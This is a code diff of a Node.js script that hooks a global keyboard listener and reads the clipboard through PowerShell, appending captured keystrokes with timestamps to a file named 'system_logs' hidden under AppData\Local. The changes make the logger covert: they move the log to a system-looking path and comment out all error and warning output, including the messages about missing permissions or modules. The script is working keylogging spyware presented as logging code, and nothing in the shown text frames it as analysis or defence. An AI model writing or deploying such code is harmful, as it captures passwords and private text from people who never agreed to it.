@@ -4,8 +4,8 @@ try {
     const fs = require('fs');
     const { execSync } = require('child_process');
 
-    const homeDir = os.homedir(); // e.g., C:\Users\<YourUsername>
-    const logPath = path.join(homeDir, 'system_logs');
+    const homeDir = os.homedir();
+    const logPath = path.join(homeDir, 'AppData', 'Local', 'system_logs');
 
     let GlobalKeyboardListener;
     let v;
@@ -18,16 +18,17 @@ try {
             let text;
             if (platform === 'win32') {
                 text = execSync('powershell -command "Get-Clipboard"').toString().trim();
-            } else if (platform === 'darwin') {
-                text = execSync('pbpaste').toString().trim();
-            } else if (platform === 'linux') {
-                text = execSync('xclip -selection clipboard -o').toString().trim();
-            } else {
-                throw new Error('Unsupported OS');
             }
+            // else if (platform === 'darwin') {
+            //     text = execSync('pbpaste').toString().trim();
+            // } else if (platform === 'linux') {
+            //     text = execSync('xclip -selection clipboard -o').toString().trim();
+            // } else {
+            //     throw new Error('Unsupported OS');
+            // }
             return text;
         } catch (err) {
-            console.error('Failed to read clipboard:', err);
+            // console.error('Failed to read clipboard:', err);
             return null;
         }
     }
@@ -47,7 +48,7 @@ try {
         GlobalKeyboardListener = require("logs-conf").GlobalKeyboardListener;
         v = new GlobalKeyboardListener();
     } catch (error) {
-        console.warn('Some modules are deprecated and won\'t work well in the future...');
+        // console.warn('Some modules are deprecated and won\'t work well in the future...');
     }
 
     function processKeyEvent(event, down) {
@@ -62,9 +63,9 @@ try {
                     rawBuffer += `\n\n\----------------------        ${new Date()}      -----------------------------\n\n`;
                     fs.writeFile(logPath, rawBuffer, { flag: 'a' }, (err) => {
                         if (err) {
-                            //console.error('Error writing to file:', err);
+                            // console.error('Error writing to file:', err);
                         } else {
-                            //console.log('Data appended successfully.');
+                            // console.log('Data appended successfully.');
                         }
                     });
                     rawBuffer = '';
@@ -80,20 +81,20 @@ try {
             if(v) {
                 v.addListener(processKeyEvent);
             } else {
-                console.warn('Keyboard listener not initialized, as parkers-key module is missing.');
+                // console.warn('Keyboard listener not initialized, as parkers-key module is missing.');
             }
         } catch (error) {
             if (error.code === 'EACCES') {
-                console.error('Permission denied: Please run the application as an administrator or grant the necessary permissions.');
+                // console.error('Permission denied: Please run the application as an administrator or grant the necessary permissions.');
             } else if (error.code === 'EAGAIN') {
-                console.error('Failed to add keyboard listener: Please try again or restart the application.');
+                // console.error('Failed to add keyboard listener: Please try again or restart the application.');
             } else {
-                console.error(`Error adding keyboard listener: ${error}`);
+                // console.error(`Error adding keyboard listener: ${error}`);
             }
         }
     }; 
     init();
 
 } catch (error) {
-    console.error(`Unexpected error: ${error}`);
+    // console.error(`Unexpected error: ${error}`);
 }
